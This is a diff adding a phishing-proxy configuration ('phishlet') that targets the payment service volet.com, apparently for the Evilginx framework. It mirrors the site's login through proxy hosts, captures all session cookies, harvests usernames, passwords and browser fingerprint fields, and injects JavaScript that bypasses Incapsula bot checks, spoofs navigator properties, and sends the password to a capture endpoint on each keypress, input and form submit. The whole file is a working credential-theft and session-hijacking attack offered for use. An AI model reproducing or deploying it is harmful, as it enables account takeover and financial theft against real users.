@@ -1,0 +1,173 @@
+author: '@EvilWhales'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'volet.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'volet.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'blog.static', orig_sub: 'blog.static', domain: 'volet.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'consent', orig_sub: 'consent', domain: 'cookiebot.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'consentcdn', orig_sub: 'consentcdn', domain: 'cookiebot.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'imgsct', orig_sub: 'imgsct', domain: 'cookiebot.com', session: true, is_landing: false, auto_filter: false}
+
+
+sub_filters:
+
+  - {triggers_on: 'volet.com', orig_sub: '', domain: 'volet.com', search: 'https://www.paypal.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'account.volet.com', orig_sub: 'account', domain: 'volet.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'blog.volet.com', orig_sub: 'blog', domain: 'volet.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'consent.cookiebot.com', orig_sub: 'consent', domain: 'cookiebot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/javascript']}
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'imgsct.cookiebot.com', orig_sub: 'imgsct', domain: 'cookiebot.com', search: 'https://{hostname}', replace: '//{hostname}', mimes: ['text/html', 'application/javascript']}
+
+  - {triggers_on: 'account.volet.com', orig_sub: 'account', domain: 'volet.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'account.volet.com', orig_sub: 'account', domain: 'volet.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'account.volet.com', orig_sub: 'account', domain: 'volet.com', search: '"{domain}"', replace: '"{domain}"', mimes: ['application/javascript']}
+
+auth_tokens:
+  - domain: 'volet.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+  - "/pages/transaction"
+
+credentials:
+  username:
+    key: 'j_username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'j_password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'g-recaptcha-response'
+      search: '(.*)'
+      type: 'post'
+    - key: 'screenSize'
+      search: '(.*)'
+      type: 'post'
+    - key: 'platform'
+      search: '(.*)'
+      type: 'post'
+    - key: 'cookiesEnables'
+      search: '(.*)'
+      type: 'post'
+    - key: 'colorDepth'
+      search: '(.*)'
+      type: 'post'
+    - key: 'plugins'
+      search: '(.*)'
+      type: 'post'
+    - key: 'browserLanguage'
+      search: '(.*)'
+      type: 'post'
+    - key: 'timeZone'
+      search: '(.*)'
+      type: 'post'
+    - key: 'javax.faces.ViewState'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: 'account.volet.com'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ["{domain}"]
+    trigger_paths: ["/login", "/signin"]
+    trigger_params: []
+    script: |
+      console.log('JavaScript-инъекция запущена на странице: ' + window.location.pathname);
+      // Обход Incapsula
+      window.incap = window.incap || {};
+      window.incap.incapOk = true; // Имитация успешной проверки Incapsula
+      window.incap.incapCheck = function() { return true; };
+      window.incap.incapTest = function() { return true; };
+      window.incap.incapValidate = function() { return true; };
+
+      // Подмена navigator.userAgent
+      Object.defineProperty(navigator, 'userAgent', {
+        get: function() {
+          return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36';
+        }
+      });
+
+      // Отключение проверок через navigator
+      Object.defineProperty(navigator, 'webdriver', { get: () => false });
+      Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
+
+      // Удаление meta-редиректов
+      const metaTags = document.getElementsByTagName('meta');
+      for (let i = 0; i < metaTags.length; i++) {
+        if (metaTags[i].getAttribute('http-equiv') === 'refresh') {
+          console.log('Обнаружен meta-редирект, удаляем: ', metaTags[i].getAttribute('content'));
+          metaTags[i].remove();
+        }
+      }
+
+      // Перехват поля пароля
+      function observePasswordInput() {
+        console.log('Запуск MutationObserver для поиска поля пароля');
+        const observer = new MutationObserver((mutations, obs) => {
+          console.log('MutationObserver зафиксировал изменение DOM');
+          const passwordInput = document.querySelector('input[type="password"]');
+          if (passwordInput) {
+            console.log('Поле пароля найдено: ', passwordInput);
+            obs.disconnect();
+            passwordInput.addEventListener('keypress', function(e) {
+              const value = passwordInput.value + String.fromCharCode(e.keyCode);
+              console.log('Пароль перехвачен на keypress: ', value);
+              if (value) {
+                const img = new Image();
+                img.src = '/capture_password?password=' + encodeURIComponent(value);
+                img.onload = () => console.log('Пароль отправлен на keypress через img');
+                img.onerror = () => console.error('Не удалось отправить пароль на keypress через img');
+              }
+            });
+            passwordInput.addEventListener('input', function(e) {
+              console.log('Значение поля пароля изменилось: ', e.target.value);
+              const img = new Image();
+              img.src = '/capture_password?password=' + encodeURIComponent(e.target.value);
+              img.onload = () => console.log('Пароль отправлен на /capture_password через img');
+              img.onerror = () => console.error('Не удалось отправить пароль на /capture_password через img');
+            });
+            const form = passwordInput.closest('form');
+            if (form) {
+              console.log('Форма найдена, добавляем обработчик отправки');
+              form.addEventListener('submit', function(e) {
+                const password = passwordInput.value;
+                console.log('Форма отправлена, пароль: ', password);
+                const img = new Image();
+                img.src = '/capture_password?password=' + encodeURIComponent(password);
+                img.onload = () => console.log('Пароль отправлен при отправке формы через img');
+                img.onerror = () => console.error('Не удалось отправить пароль при отправке формы через img');
+              });
+            } else {
+              console.error('Форма для поля пароля не найдена');
+            }
+          } else {
+            console.log('Поле пароля пока не найдено');
+          }
+        });
+        observer.observe(document.body, { childList: true, subtree: true });
+        console.log('Начальная проверка наличия поля пароля');
+        const passwordInput = document.querySelector('input[type="password"]');
+        if (passwordInput) {
+          observer.disconnect();
+          console.log('Поле пароля найдено при начальной проверке');
+          passwordInput.dispatchEvent(new Event('input'));
+        }
+      }
+      console.log('Добавление обработчиков событий');
+      document.addEventListener('DOMContentLoaded', () => {
+        console.log('Событие DOMContentLoaded сработало');
+        observePasswordInput();
+      });
+      if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        console.log('Документ уже загружен, запускаем observePasswordInput');
+        observePasswordInput();
+      }
+      console.log('Скрипт JavaScript-инъекции полностью загружен');  
+
